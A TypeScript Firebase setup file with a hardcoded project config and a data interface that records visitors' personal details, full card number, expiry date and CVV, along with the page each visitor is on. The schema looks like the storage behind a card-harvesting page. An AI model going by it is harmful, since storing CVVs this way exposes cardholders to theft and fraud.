import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
   apiKey: "AIzaSyCzNSkFUhkO64TBxdTFJV4diD0YYlwRbWQ",
  authDomain: "edeewq-5432d.firebaseapp.com",
  projectId: "edeewq-5432d",
  storageBucket: "edeewq-5432d.firebasestorage.app",
  messagingSenderId: "639520471860",
  appId: "1:639520471860:web:663f86432852e63bbdc361",
  measurementId: "G-SQ35T785N1"
};


const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

